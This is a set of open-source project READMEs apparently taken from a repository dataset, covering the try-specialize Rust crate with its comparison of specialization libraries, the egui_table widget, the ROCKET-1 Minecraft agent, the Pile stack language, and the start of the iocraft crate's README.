<a name=""zero-cost""></a> Library tests ensure that specializations are
performed at compile time and are fully optimized with no runtime cost at
`opt-level >= 1`. Note that the [release] profile uses `opt-level = 3`
by default.

## Usage

Add this to your `Cargo.toml`:

```toml
[dependencies]
try-specialize = ""0.1.1""
```

Then, you can use [`TrySpecialize`] trait methods like
[`TrySpecialize::try_specialize`], [`TrySpecialize::try_specialize_ref`] and
[`TrySpecialize::try_specialize_static`]. To check the possibility of
specialization in advance and use it infallibly multiple times, including
reversed or mapped specialization, use [`Specialization`] struct methods.

Note that unlike casting, [subtyping], and [coercion], specialization does
not alter the underlying type or data. It merely qualifies the underlying
types of generics, succeeding only when the underlying types of `T1` and
`T2` are equal.

## Examples

Specialize type to any [`LifetimeFree`] type:
```rust
use try_specialize::TrySpecialize;

fn func<T>(value: T) {
    match value.try_specialize::<(u32, String)>() {
        Ok(value) => specialized_impl(value),
        Err(value) => default_impl(value),
    }
}
```

Specialize `'static` type to any `'static` type:
```rust
use try_specialize::TrySpecialize;

fn func<T>(value: T)
where
    T: 'static,
{
    match value.try_specialize_static::<(u32, &'static str)>() {
        Ok(value) => specialized_impl(value),
        Err(value) => default_impl(value),
    }
}
```

Specialize `Sized` or `Unsized` type reference to any [`LifetimeFree`] type
reference:
```rust
use try_specialize::TrySpecialize;

fn func<T>(value: &T)
where
    T: ?Sized, // Relax the implicit `Sized` bound.
{
    match value.try_specialize_ref::<str>() {
        Some(value) => specialized_impl(value),
        None => default_impl(value),
    }
}
```

Specialize `Sized` or `Unsized` type mutable reference to any
[`LifetimeFree`] type mutable reference:
```rust
use try_specialize::TrySpecialize;

fn func<T>(value: &mut T)
where
    T: ?Sized, // Relax the implicit `Sized` bound.
{
    match value.try_specialize_mut::<[u8]>() {
        Some(value) => specialized_impl(value),
        None => default_impl(value),
    }
}
```

Specialize a third-party library container with generic types:
```rust
use try_specialize::{Specialization, TypeFn};

fn func<K, V>(value: hashbrown::HashMap<K, V>) {
    struct MapIntoHashMap;
    impl<K, V> TypeFn<(K, V)> for MapIntoHashMap {
        type Output = hashbrown::HashMap<K, V>;
    }

    if let Some(spec) = Specialization::<(K, V), (u32, char)>::try_new() {
        let spec = spec.map::<MapIntoHashMap>();
        let value: hashbrown::HashMap<u32, char> = spec.specialize(value);
        specialized_impl(value);
    } else {
        default_impl(value);
    }
}
```

For a more comprehensive example, see the [`examples/encode.rs`], which
implements custom data encoders and decoders with per-type encoding and
decoding errors and optimized byte array encoding and decoding.
The part of this example related to the `Encode` implementation for a slice:
```rust
// ...

impl<T> Encode for [T]
where
    T: Encode,
{
    type EncodeError = T::EncodeError;

    #[inline]
    fn encode_to<W>(&self, writer: &mut W) -> Result<(), Self::EncodeError>
    where
        W: ?Sized + Write,
    {
        if let Some(spec) = Specialization::<[T], [u8]>::try_new() {
            // Specialize self from `[T; N]` to `[u32; N]`
            let bytes: &[u8] = spec.specialize_ref(self);
            // Map type specialization to its associated error specialization.
            let spec_err = spec.rev().map::<MapToEncodeError>();
            writer
                .write_all(bytes)
                // Specialize error from `io::Error` to `Self::EncodeError`.
                .map_err(|err| spec_err.specialize(err))?;
        } else {
            for item in self {
                item.encode_to(writer)?;
            }
        }
        Ok(())
    }
}

// ...
```

Find values by type in generic composite types:
```rust
use try_specialize::{LifetimeFree, TrySpecialize};

pub trait ConsListLookup {
    fn find<T>(&self) -> Option<&T>
    where
        T: ?Sized + LifetimeFree;
}

impl ConsListLookup for () {
    #[inline]
    fn find<T>(&self) -> Option<&T>
    where
        T: ?Sized + LifetimeFree,
    {
        None
    }
}

impl<T1, T2> ConsListLookup for (T1, T2)
where
    T2: ConsListLookup,
{
    #[inline]
    fn find<T>(&self) -> Option<&T>
    where
        T: ?Sized + LifetimeFree,
    {
        self.0.try_specialize_ref().or_else(|| self.1.find::<T>())
    }
}

#[derive(Eq, PartialEq, Debug)]
struct StaticStr(&'static str);
// SAFETY: It is safe to implement `LifetimeFree` for structs with no
// parameters.
unsafe impl LifetimeFree for StaticStr {}

let input = (
    123_i32,
    (
        [1_u32, 2, 3, 4],
        (1_i32, (StaticStr(""foo""), (('a', false), ()))),
    ),
);

assert_eq!(input.find::<u32>(), None);
assert_eq!(input.find::<i32>(), Some(&123_i32));
assert_eq!(input.find::<[u32; 4]>(), Some(&[1, 2, 3, 4]));
assert_eq!(input.find::<[u32]>(), None);
assert_eq!(input.find::<StaticStr>(), Some(&StaticStr(""foo"")));
assert_eq!(input.find::<char>(), None);
assert_eq!(input.find::<(char, bool)>(), Some(&('a', false)));
```

## Documentation

[API Documentation]

## Feature flags

- `alloc` (implied by `std`, enabled by default): enables [`LifetimeFree`]
  implementations for `alloc` types, like `Box`, `Arc`, `String`, `Vec`,
  `BTreeMap` etc.
- `std` (enabled by default): enables `alloc` feature and [`LifetimeFree`]
  implementations for `std` types, like `OsStr`, `Path`, `PathBuf`,
  `Instant`, `HashMap` etc.
- `unreliable`: enables functions, methods and macros that rely on Rust
  standard library undocumented behavior. Refer to the [`unreliable`] module
  documentation for details.

## How it works

- Type comparison between `'static` types compares their [`TypeId::of`]s.
- Type comparison between unconstrained and [`LifetimeFree`] type treats
  them as `'static` and compares their [`TypeId::of`]s.
- Specialization relies on type comparison and [`transmute_copy`] when the
  equality of types is established.
- Unreliable trait implementation checks are performed using an expected,
  but undocumented behavior of the Rust stdlib [`PartialEq`] implementation
  for [`Arc<T>`]. [`Arc::eq`] uses fast path comparing references before
  comparing data if `T` implements [`Eq`].

## Alternative crates

- [`castaway`]: A similar crate with a much simpler macro-based API. The
  macro uses [Autoref-Based Specialization] and automatically determines the
  appropriate type of specialization, making it much easier to use. However,
  if no specialization is applicable because of the same [Autoref-Based
  Specialization], the compiler generates completely unclear errors, which
  makes it difficult to use it in complex cases. Internally uses `unsafe`
  code for type comparison and specialization.
- [`coe-rs`]: Smaller and simpler, but supports only static types and don't
  safely combine type equality check and specialization. Internally uses
  `unsafe` code for type specialization.
- [`downcast-rs`]: Specialized on trait objects (`dyn`) downcasting. Can't
  be used to specialize unconstrained types.
- [`syllogism`] and [`syllogism_macro`]: Requires to provide all possible
  types to macro that generate a lot of boilerplate code and can't be used
  to specialize stdlib types because of orphan rules.
- [`specialize`](https://crates.io/crates/specialize): Requires nightly.
  Adds a simple macro to inline nightly [`min_specialization`] usage into
  simple `if let` expressions.
- [`specialized-dispatch`]: Requires nightly. Adds a macro to inline nightly
  [`min_specialization`] usage into a `match`-like macro.
- [`spez`]: Specializes expression types, using [Autoref-Based
  Specialization]. It won't works in generic context but can be used in the
  code generated by macros.
- [`impls`]: Determine if a type implements a trait. Can't detect erased
  type bounds, so not applicable in generic context, but can be used in the
  code generated by macros.

### Comparison of libraries supporting specialization in generic context:

|  | crate <br /> `try-specialize` | crate <br /> [`castaway`] | crate <br /> [`coe-rs`] | crate <br /> [`downcast-rs`] | crate <br /> [`syllogism`] | [`min_spec...`] <br /> nightly feature | crate <br /> [`specialize`](https://crates.io/crates/specialize) | crate <br /> [`spec...ch`]
| --: | :--: | :--: | :--: | :--: | :--: | :--: | :--: | :--: |
| Checked version | `0.1.1` | `0.2.3` | `0.1.2` | `1.2.1` | `0.1.3` | N/A | `0.0.3` | `0.2.1` |
| Rust toolchain | **Stable** | **Stable** | **Stable** | **Stable** | **Stable** | Nightly | Nightly | Nightly |
| API complexity | Complex | **Simple** | **Simple** | Moderate | **Simple** | **Simple** | **Simple** | **Simple** |
| API difficulty | Difficult | **Easy** | **Easy** | Moderate | Moderate | **Easy** | **Easy** | Moderate |
| Zero-cost (compile-time optimized) | **YES** | **YES** | **YES** | no | **YES** | **YES** | **YES** | **YES** |
| Safely combines type eq check and specialization | **YES** | **YES** | no | **YES** | **YES** | **YES** |**YES** | **YES** |
| Specialize value references | **YES** | **YES** | **YES** | N/A | **YES** | **YES** | **YES** | no |
| Specialize values | **YES** | **YES** | no | N/A | **YES** | **YES** | **YES** | **YES** |
| Specialize values without consume on failure | **YES** | **YES** | no | N/A | **YES** | **YES** | no | **YES** |
| Limited non-static value specialization | **YES** | **YES** | no | N/A | **YES** | **YES** | **YES** | **YES** |
| Full non-static value specialization | no | no | no | N/A | **YES** | no | no | no |
| Specialize trait objects (`dyn`) | N/A | N/A | N/A | **YES** | N/A | N/A | N/A | N/A |
| Compare types without instantiation | **YES** | no | **YES** | no | **YES** | **YES** | **YES** | no |
| Support std types | **YES** | **YES** | **YES** | **YES** | no | **YES** | **YES** | **YES** |
| Specialize from unconstrained type | **YES** | **YES** | no | no | no | **YES** | **YES** | **YES** |
| Specialize to unconstrained type | **YES** | no | no | no | no | **YES** | **YES** | **YES** |
| Check generic implements ""erased"" trait | **YES**, but [`unreliable`] | no | no | no | no | **YES** | **YES** | **YES** |
| Specialize to generic with added bounds | no | no | no | no | no | **YES** | **YES** | **YES** |
| API based on | Traits | Macros | Traits | Macros + Traits | Traits | Language | Macros | Macros |
| Type comparison implementation based on | [`TypeId`] <br /> + [`transmute`] | [`TypeId`] <br /> + [`transmute`] |[`TypeId`] | N/A | Traits | Language | Nightly <br /> feature | Nightly <br /> feature |
| Type casting implementation based on | [`transmute_copy`] | [`ptr::read`] | [`transmute`] | [`std::any::Any`] | Traits | Language | Nightly <br /> feature | Nightly <br /> feature |
| Implementation free of `unsafe` | no | no | no | **YES** | **YES** | **YES** | **YES** | **YES** |

### Primitive example of the value specialization using different libraries

<table><tbody><tr><td style=""vertical-align: top"">

crate `try_specialize`:

```rust
use try_specialize::TrySpecialize;

fn spec<T>(value: T) -> Result<u32, T> {
    value.try_specialize()
}

assert_eq!(spec(42_u32), Ok(42));
assert_eq!(spec(42_i32), Err(42));
assert_eq!(spec(""abc""), Err(""abc""));
```

</td><td style=""vertical-align: top"">

crate [`castaway`]:

```rust
use castaway::cast;

fn spec<T>(value: T) -> Result<u32, T> {
    cast!(value, _)
}

assert_eq!(spec(42_u32), Ok(42));
assert_eq!(spec(42_i32), Err(42));
assert_eq!(spec(""abc""), Err(""abc""));
```

</td></tr><tr><td style=""vertical-align: top"">

crate [`coe-rs`]:

```rust
use coe::{is_same, Coerce};

// Library don't support non-reference.
// specialization. Using reference.
fn spec<T>(value: &T) -> Option<&u32>
where
    // Library don't support specialization of
    // unconstrained non-static types.
    T: 'static,
{
    is_same::<u32, T>().then(|| value.coerce())
}

fn main() {
    assert_eq!(spec(&42_u32), Some(&42));
    assert_eq!(spec(&42_i32), None);
    assert_eq!(spec(&""abc""), None);
}
```

</td><td style=""vertical-align: top"">

crates [`downcast-rs`]:

```rust
use downcast_rs::{impl_downcast, DowncastSync};

trait Base: DowncastSync {}
impl_downcast!(sync Base);

// Library requires all specializable
// types to be defined in advance.
impl Base for u32 {}
impl Base for i32 {}
impl Base for &'static str {}

// Library support only trait objects (`dyn`).
fn spec(value: &dyn Base) -> Option<&u32> {
    value.downcast_ref::<u32>()
}

fn main() {
    assert_eq!(spec(&42_u32), Some(&42));
    assert_eq!(spec(&42_i32), None);
    assert_eq!(spec(&""abc""), None);
}
```

</td></tr><tr><td style=""vertical-align: top"">

crate [`specialize`](https://crates.io/crates/specialize):

```rust
// Requires nightly.
#![feature(min_specialization)]

use specialize::constrain;

// Library don't support non-consuming
// value specialization. Using reference.
fn spec<T: ?Sized>(value: &T) -> Option<&u32> {
    constrain!(ref value as u32)
}

assert_eq!(spec(&42_u32), Some(&42));
assert_eq!(spec(&42_i32), None);
assert_eq!(spec(""abc""), None);
```

</td><td style=""vertical-align: top"">

crate [`specialized-dispatch`]:
```rust
// Requires nightly.
#![feature(min_specialization)]

use specialized_dispatch::specialized_dispatch;

// The library don't support using generics.
// from outer item. Using `Option`.
fn spec<T>(value: T) -> Option<u32> {
    specialized_dispatch! {
        T -> Option<u32>,
        fn (value: u32) => Some(value),
        default fn <T>(_: T) => None,
        value,
    }
}

assert_eq!(spec(42_u32), Some(42));
assert_eq!(spec(42_i32), None);
assert_eq!(spec(""abc""), None);
```

</td></tr><tr><td style=""vertical-align: top"">

crates [`syllogism`] and [`syllogism_macro`]:

```rust
use syllogism::{Distinction, Specialize};
use syllogism_macro::impl_specialization;

// Library specialization can not be
// implemented for std types because of
// orphan rules. Using custom local types.
#[derive(Eq, PartialEq, Debug)]
struct U32(u32);
#[derive(Eq, PartialEq, Debug)]
struct I32(i32);
#[derive(Eq, PartialEq, Debug)]
struct Str<'a>(&'a str);

// Library requires all specializable
// types to be defined in one place.
impl_specialization!(
    type U32;
    type I32;
    type Str<'a>;
);

fn spec<T>(value: T) -> Result<U32, T>
where
    T: Specialize<U32>,
{
    match value.specialize() {
        Distinction::Special(value) => Ok(value),
        Distinction::Generic(value) => Err(value),
    }
}

assert_eq!(spec(U32(42)), Ok(U32(42)));
assert_eq!(spec(I32(42_i32)), Err(I32(42)));
assert_eq!(spec(Str(""abc"")), Err(Str(""abc"")));
```

</td><td style=""vertical-align: top"">

[`min_specialization`] nightly feature:

```rust
// Requires nightly.
#![feature(min_specialization)]

// The artificial example looks a bit long.
// More real-world use cases are usually
// on the contrary more clear and understandable.
pub trait Spec: Sized {
    fn spec(self) -> Result<u32, Self>;
}

impl<T> Spec for T {
    default fn spec(self) -> Result<u32, Self> {
        Err(self)
    }
}

impl Spec for u32 {
    fn spec(self) -> Result<u32, Self> {
        Ok(self)
    }
}

assert_eq!(Spec::spec(42_u32), Ok(42));
assert_eq!(Spec::spec(42_i32), Err(42));
assert_eq!(Spec::spec(""abc""), Err(""abc""));
```

</td></tr></tbody></table>

## License

Licensed under either of

- Apache License, Version 2.0 ([LICENSE-APACHE](LICENSE-APACHE) or <https://www.apache.org/licenses/LICENSE-2.0>)
- MIT license ([LICENSE-MIT](LICENSE-MIT) or <https://opensource.org/licenses/MIT>)

at your option.

## Contribution

Unless you explicitly state otherwise, any contribution intentionally
submitted for inclusion in the work by you, as defined in the Apache-2.0
license, shall be dual licensed as above, without any
additional terms or conditions.

[API Documentation]: https://docs.rs/try-specialize
[subtyping]: https://doc.rust-lang.org/nomicon/subtyping.html
[coercion]: https://doc.rust-lang.org/nomicon/coercions.html
[release]: https://doc.rust-lang.org/cargo/reference/profiles.html#release
[`min_specialization`]: https://github.com/rust-lang/rust/pull/68970
[`min_spec...`]: https://github.com/rust-lang/rust/pull/68970 ""min_specialization""

[`examples/encode.rs`]: https://github.com/zheland/try-specialize/blob/v0.1.1/examples/encode.rs

[`std::any::TypeId`]: https://doc.rust-lang.org/std/any/struct.TypeId.html
[`TypeId`]: https://doc.rust-lang.org/std/any/struct.TypeId.html ""std::any::TypeId""
[`std::any::Any`]: https://doc.rust-lang.org/std/any/trait.Any.html
[`TypeId::of`]: https://doc.rust-lang.org/std/any/struct.TypeId.html#method.of ""std::any::TypeId::of""
[`transmute`]: https://doc.rust-lang.org/std/mem/fn.transmute.html ""std::mem::transmute""
[`transmute_copy`]: https://doc.rust-lang.org/std/mem/fn.transmute_copy.html ""std::mem::transmute_copy""
[`ptr::read`]: https://doc.rust-lang.org/std/ptr/fn.read.html ""std::ptr::read""
[`PartialEq`]: https://doc.rust-lang.org/std/cmp/trait.PartialEq.html ""std::cmp::PartialEq""
[`Eq`]: https://doc.rust-lang.org/std/cmp/trait.Eq.html ""std::cmp::Eq""
[`Arc::eq`]: https://doc.rust-lang.org/std/sync/struct.Arc.html#method.eq ""<std::sync::Arc as PartialEq>::eq""
[`Arc<T>`]: https://doc.rust-lang.org/std/sync/struct.Arc.html ""std::sync::Arc""

[`unreliable`]: https://docs.rs/try-specialize/latest/try_specialize/unreliable/index.html
[`LifetimeFree`]: https://docs.rs/try-specialize/latest/try_specialize/trait.LifetimeFree.html

[`Specialization`]: https://docs.rs/try-specialize/latest/try_specialize/struct.Specialization.html
[`try_new`]: https://docs.rs/try-specialize/latest/try_specialize/struct.Specialization.html#method.try_new ""Specialization::try_new""
[`try_new_static`]: https://docs.rs/try-specialize/latest/try_specialize/struct.Specialization.html#method.try_new_static ""Specialization::try_new_static""
[`try_new_ignore_lifetimes`]: https://docs.rs/try-specialize/latest/try_specialize/struct.Specialization.html#method.try_new_ignore_lifetimes ""Specialization::try_new_ignore_lifetimes""
[`rev`]: https://docs.rs/try-specialize/latest/try_specialize/struct.Specialization.html#method.rev ""Specialization::rev""
[`map`]: https://docs.rs/try-specialize/latest/try_specialize/struct.Specialization.html#method.map ""Specialization::map""
[`specialize`]: https://docs.rs/try-specialize/latest/try_specialize/struct.Specialization.html#method.specialize ""Specialization::specialize""
[`specialize_ref`]: https://docs.rs/try-specialize/latest/try_specialize/struct.Specialization.html#method.specialize_ref ""Specialization::specialize_ref""
[`specialize_mut`]: https://docs.rs/try-specialize/latest/try_specialize/struct.Specialization.html#method.specialize_mut ""Specialization::specialize_mut""

[`WeakSpecialization`]: https://docs.rs/try-specialize/latest/try_specialize/unreliable/trait.WeakSpecialization.html
[`try_new_if_lifetime_free_weak`]: https://docs.rs/try-specialize/latest/try_specialize/unreliable/trait.WeakSpecialization.html#method.try_new_if_lifetime_free_weak ""unreliable::WeakSpecialization::try_new_if_lifetime_free_weak""

[`TrySpecialize`]: https://docs.rs/try-specialize/latest/try_specialize/trait.TrySpecialize.html
[`TrySpecialize::try_specialize`]: https://docs.rs/try-specialize/latest/try_specialize/trait.TrySpecialize.html#method.try_specialize
[`try_specialize`]: https://docs.rs/try-specialize/latest/try_specialize/trait.TrySpecialize.html#method.try_specialize ""TrySpecialize::try_specialize""
[`TrySpecialize::try_specialize_ref`]: https://docs.rs/try-specialize/latest/try_specialize/trait.TrySpecialize.html#method.try_specialize_ref
[`try_specialize_ref`]: https://docs.rs/try-specialize/latest/try_specialize/trait.TrySpecialize.html#method.try_specialize_ref ""TrySpecialize::try_specialize_ref""
[`try_specialize_from`]: https://docs.rs/try-specialize/latest/try_specialize/trait.TrySpecialize.html#method.try_specialize_from ""TrySpecialize::try_specialize_from""
[`try_specialize_from_ref`]: https://docs.rs/try-specialize/latest/try_specialize/trait.TrySpecialize.html#method.try_specialize_from_ref ""TrySpecialize::try_specialize_from_ref""
[`TrySpecialize::try_specialize_static`]: https://docs.rs/try-specialize/latest/try_specialize/trait.TrySpecialize.html#method.try_specialize_static
[`try_specialize_static`]: https://docs.rs/try-specialize/latest/try_specialize/trait.TrySpecialize.html#method.try_specialize_static ""TrySpecialize::try_specialize_static""
[`try_specialize_ref_static`]: https://docs.rs/try-specialize/latest/try_specialize/trait.TrySpecialize.html#method.try_specialize_ref_static ""TrySpecialize::try_specialize_ref_static""
[`..._ignore_lifetimes`]: https://docs.rs/try-specialize/latest/try_specialize/trait.TrySpecialize.html#method.try_specialize_ignore_lifetimes ""TrySpecialize::try_specialize_ignore_lifetimes""
[`..._ref_ignore_lifetimes`]: https://docs.rs/try-specialize/latest/try_specialize/trait.TrySpecialize.html#method.try_specialize_ref_ignore_lifetimes ""TrySpecialize::try_specialize_ref_ignore_lifetimes""
[`..._mut_ignore_lifetimes`]: https://docs.rs/try-specialize/latest/try_specialize/trait.TrySpecialize.html#method.try_specialize_mut_ignore_lifetimes ""TrySpecialize::try_specialize_mut_ignore_lifetimes""

[`TrySpecializeWeak`]: https://docs.rs/try-specialize/latest/try_specialize/unreliable/trait.TrySpecializeWeak.html
[`..._if_lifetime_free_weak`]: https://docs.rs/try-specialize/latest/try_specialize/unreliable/trait.TrySpecializeWeak.html#method.try_specialize_if_lifetime_free_weak ""unreliable::TrySpecializeWeak::try_specialize_if_lifetime_free_weak""
[`..._ref_if_lifetime_free_weak`]: https://docs.rs/try-specialize/latest/try_specialize/unreliable/trait.TrySpecializeWeak.html#method.try_specialize_ref_if_lifetime_free_weak ""unreliable::TrySpecializeWeak::try_specialize_ref_if_lifetime_free_weak""
[`..._mut_if_lifetime_free_weak`]: https://docs.rs/try-specialize/latest/try_specialize/unreliable/trait.TrySpecializeWeak.html#method.try_specialize_mut_if_lifetime_free_weak ""unreliable::TrySpecializeWeak::try_specialize_mut_if_lifetime_free_weak""

[`castaway`]: https://crates.io/crates/castaway
[`syllogism`]: https://crates.io/crates/syllogism
[`syllogism_macro`]: https://crates.io/crates/syllogism_macro
[`specialized-dispatch`]: https://crates.io/crates/specialized-dispatch
[`spec...ch`]: https://crates.io/crates/specialized-dispatch ""specialized-dispatch""
[`spez`]: https://crates.io/crates/spez
[`coe-rs`]: https://crates.io/crates/coe-rs
[`downcast-rs`]: https://crates.io/crates/downcast-rs
[`impls`]: https://crates.io/crates/impls

[Autoref-Based Specialization]: https://lukaskalbertodt.github.io/2019/12/05/generalized-autoref-based-specialization.html
",0,0,1,Apache-2.0,"build.yml,coverage.yml",0.0
rerun-io/egui_table,main,"# ‚ò∞ `egui_table`

[<img alt=""github"" src=""https://img.shields.io/badge/github-rerun_io/egui_table-8da0cb?logo=github"" height=""20"">](https://github.com/rerun-io/egui_table)
[![Latest version](https://img.shields.io/crates/v/egui_table.svg)](https://crates.io/crates/egui_table)
[![Documentation](https://docs.rs/egui_table/badge.svg)](https://docs.rs/egui_table)
[![unsafe forbidden](https://img.shields.io/badge/unsafe-forbidden-success.svg)](https://github.com/rust-secure-code/safety-dance/)
[![Apache](https://img.shields.io/badge/license-Apache-blue.svg)](https://github.com/rerun-io/egui_table/blob/master/LICENSE-APACHE)
[![MIT](https://img.shields.io/badge/license-MIT-blue.svg)](https://github.com/rerun-io/egui_table/blob/master/LICENSE-MIT)

Table viewer for [egui](https://www.egui.rs/).

### Design
egui_table has a ""batteries not included"" design.

### Features
* Auto-sized, resizable columns
* Hierarchical column titles
* Sticky columns and header
* Expanding rows
* Support for millions of rows
* Heterogenous row heights


### Testing
* Locally: `cargo run -p demo`
* Web locally: `(cd demo && trunk serve)`
* Web: <https://rerun-io.github.io/egui_table/>
",1,1,4,Apache-2.0,"labels.yml,links.yml,pages.yml,rust.yml,typos.yml",12.0
CraftJarvis/ROCKET-1,main,"# ROCKET-1: Mastering Open-World Interaction with Visual-Temporal Context Prompting

[`Shaofei Cai`](https://phython96.github.io/) | [`Zihao Wang`](https://zhwang4ai.github.io/) | [`Kewei Lian`](https://kevin-lkw.github.io/) | [`Zhancun Mu`](https://zhancunmu.owlstown.net/) | [`Xiaojian Ma`](https://jeasinema.github.io/) | [`Anji Liu`](https://liuanji.github.io/) | [`Yitao Liang`](https://scholar.google.com/citations?user=KVzR1XEAAAAJ&hl=zh-CN&oi=ao)

All authors are affiliated with Team **[`CraftJarvis`](https://craftjarvis.github.io/)**. 

[[`Project`](https://craftjarvis.github.io/ROCKET-1/)] | [[`Paper`](https://arxiv.org/abs/2410.17856)] | [[`huggingface`](https://huggingface.co/papers/2410.17856)] | [[`Demo`](https://huggingface.co/spaces/phython96/ROCKET-1-DEMO)] | [[`BibTex`](#citig_rocket)] 

![](rocket/assets/teaser.png)


## Latest updates

- **11/03/2024 -- We have built a huggingface space for online demo!**
- **11/02/2024 -- ROCKET-1 inference scripts are released!**

## Docker

```sh
docker run -it -p 7860:7860 --platform=linux/amd64 --gpus all \
	registry.hf.space/phython96-rocket-1-demo:latest 
```

## Installation

First, download the scripts and install dependencies. 

```sh

sudo apt-get install libghc-x11-dev gcc-multilib g++-multilib \
    libglew-dev libosmesa6-dev libgl1-mesa-glx libglfw3

git clone git@github.com:CraftJarvis/ROCKET-1.git
conda create -n rocket python=3.10
conda activate rocket
conda install --channel=conda-forge openjdk=8
# install ROCKET-1
cd ROCKET-1
pip install -e .
# install scripts for realtime segmentation
cd rocket/realtime_sam
pip install -e .
# download segment-anything-model checkpoints
cd checkpoints
bash download_ckpts.sh
```

Second, download the MCP-Reborn.zip from huggingface and check if the environment runs well. 

```sh
cd rocket/stark_tech
# download the simulator (Minecraft 1.16.5)
python -c ""from huggingface_hub import hf_hub_download;hf_hub_download(repo_id='phython96/ROCKET-MCP-Reborn', filename='MCP-Reborn.zip', local_dir='.')""
unzip MCP-Reborn.zip && rm MCP-Reborn.zip

# check if the simulator runs well
python env_interface.py
```

If you can see these logs, it means the simulator works well!
```
[Close-ended] Slow reset with world seed:  19961103
INFO: Starting Minecraft process with device: cpu
{'img': Box(0, 255, (224, 224, 3), uint8), 'text': <class 'str'>, 'obs_conf': typing.Dict}
Dict('buttons': MultiDiscrete([8641]), 'camera': MultiDiscrete([121]))
frame: 0, fps: 32.88, avg_fps: 32.88
frame: 50, fps: 28.52, avg_fps: 30.54
frame: 100, fps: 1.29, avg_fps: 29.70
...
```


## Usage
```python
from rocket.arm.models import ROCKET1
from rocket.stark_tech.env_interface import MinecraftWrapper

model = ROCKET1.from_pretrained(""phython96/ROCKET-1"").to(""cuda"")
memory = None
input = {
  ""img"": torch.rand(224, 224, 3, dtype=torch.uint8), 
  'segment': {
    'obj_id': torch.tensor(6),                              # specify the interaction type
    'obj_mask': torch.zeros(224, 224, dtype=torch.uint8),   # highlight the regions of interest
  }
}
agent_action, memory = model.get_action(input, memory, first=None, input_shape=""*"")
env_action = MinecraftWrapper.agent_action_to_env(agent_action)

# --------------------- the output --------------------- #
# agent_action = {'buttons': tensor([1], device='cuda:0'), 'camera': tensor([54], device='cuda:0')}
# env_action = {'attack': array(0), 'back': array(0), 'forward': array(0), 'jump': array(0), 'left': array(0), 'right': array(0), 'sneak': array(0), 'sprint': array(0), 'use': array(0), 'drop': array(0), 'inventory': array(0), 'hotbar.1': array(0), 'hotbar.2': array(0), 'hotbar.3': array(0), 'hotbar.4': array(0), 'hotbar.5': array(0), 'hotbar.6': array(0), 'hotbar.7': array(0), 'hotbar.8': array(0), 'hotbar.9': array(0), 'camera': array([-0.61539427, 10.        ])}
```

## Interaction Details

Here are some interaction types:
| interaction | obj_id | function | 
| --- | --- | --- |
| Hunt     | 0 | Approach the animals then kill it. | 
| Mine     | 2 | Approach and mine the target object. |
| Interact | 3 | Approach and right click the target object. | 
| Craft    | 4 | Move the cursor to the item and click on it. |
| Switch   | 5 | Highlight an item in the hotkey bar, then switch to holding state. | 
| Approach | 6 | Approach the target object. |

## Play ROCKET-1 with Gradio
Click the following picture to learn how to play ROCKET-1 with gradio. 
[![](rocket/assets/gradio.png)](https://www.youtube.com/embed/qXLWw81p-Y0)

```sh
cd rocket/arm
python eval_rocket.py --port 8110 --sam-path ""/path/to/sam2-ckpt-directory""
```


## Citing ROCKET-1
If you use ROCKET-1 in your research, please use the following BibTeX entry. 

```
@article{cai2024rocket,
  title={ROCKET-1: Master Open-World Interaction with Visual-Temporal Context Prompting},
  author={Cai, Shaofei and Wang, Zihao and Lian, Kewei and Mu, Zhancun and Ma, Xiaojian and Liu, Anji and Liang, Yitao},
  journal={arXiv preprint arXiv:2410.17856},
  year={2024}
}
```
",0,1,3,,,0.0
marc-dantas/pile,master,"<p align=""center"">
    <img width=""200"" src=""./res/logo_text.svg"" alt=""pile""></img>
</p>
<h3 align=""center"">Educational stack-based and concatenative programming language.</h3>

## Introduction to Pile
**Pile is an educational programming language designed to teach programming logic, stack-based concepts, and computer science fundamentals.**  
It provides an intuitive way to write stack-based algorithms, using **reverse Polish notation (RPN)**, where operands appear before the operation itself. Here are some RPN examples:

| **Infix notation (standard)** | **Reverse Polish notation** | **Evaluated result** |
| ----------------------------- | --------------------------- | -------------------- |
| `4 + 4`                       | `4 4 +`                     | `8`                  |
| `2 - 2 + 1`                   | `2 2 - 1 +`                 | `1`                  |
| `(6 + 1) * 2`                 | `6 1 + 2 *`                 | `14`                 |
| `6 + 1 * 2`                   | `2 1 * 6 +`                 | `8`                  |

Using RPN simplifies expression evaluation, eliminating the need for parentheses and operator precedence, which is ideal for stack-based algorithms.

## Getting Started
> **WARNING**: This language is not finished yet, there's no warranty of this software in any way. **Use it at your own risk**!.

Pile is implemented in Rust as a CLI program that interprets Pile code.

### Using Pile

Clone the repository and build the project:
- **Windows**
    ```console
    > git clone https://github.com/marc-dantas/pile.git
    > cd .\pile\
    > cargo build --release
    > .\target\release\pile.exe [your pile program]
    ```
- **Linux/UNIX**
    ```console
    $ git clone https://github.com/marc-dantas/pile.git
    $ cd ./pile/
    $ cargo build --release
    $ ./target/release/pile [your pile program]
    ```

For a quick reference, read [`basics.pile`](./basics.pile) file, which includes some examples and a compact overview of the language.

## Documentation
**_(Still in development)_**

Pile's full documentation and website is being developed at [marc-dantas/pile-online](https://github.com/marc-dantas/pile-online).

## Examples

1. **Hello World**
    ```
    # this is a comment
    ""Hello World"" println
    ```
2. **Circle Area**
    ```
    def PI 3.14159265359 end

    proc circle_area
        dup * PI *
    end

    10 circle_area println
    4 circle_area println
    4.5 circle_area println
    ```
3. **Count to Ten**
    ```
    0 loop
        dup println
        dup 10 = if stop end
        1 +
    end
    ```
4. **Fibonacci sequence**
    ```
    proc fib
        0 1
        loop
            dup N >= if
                dup println
                over over +
            else stop end
        end
    end

    def N 400 end
    fib
    ```
5. **Ask my name**
   ```
   ""What is your name? "" print
   readln
   ""Your name is "" print print ""."" println
   ```

For additional examples, explore the [`./examples`](./examples) folder.

---

> Licensed under **GPL 3.0**. See [`LICENSE`](./LICENSE) for details.

> Developed by [Marcio Dantas](https://github.com/marc-dantas)
",0,0,1,GPL-3.0,,0.0
ccbrown/iocraft,main,"<div align=""center"">
  <h1><code>iocraft</code></h1>

  <p>
    <strong>‚ú® A Rust crate for beautiful, artisanally crafted CLIs, TUIs, and text-based IO. ‚ú®</strong>
  </p>

  <p>
    <a href=""https://github.com/ccbrown/iocraft/actions""><img src=""https://img.shields.io/github/actions/workflow/status/ccbrown/iocraft/commit.yaml"" alt=""GitHub Actions Workflow Status"" /></a>
    <a href=""https://docs.rs/iocraft/""><img src=""https://img.shields.io/docsrs/iocraft"" alt=""docs.rs"" /></a>
    <a href=""https://crates.io/crates/iocraft""><img src=""https://img.shields.io/crates/v/iocraft"" alt=""crates.io"" /></a>
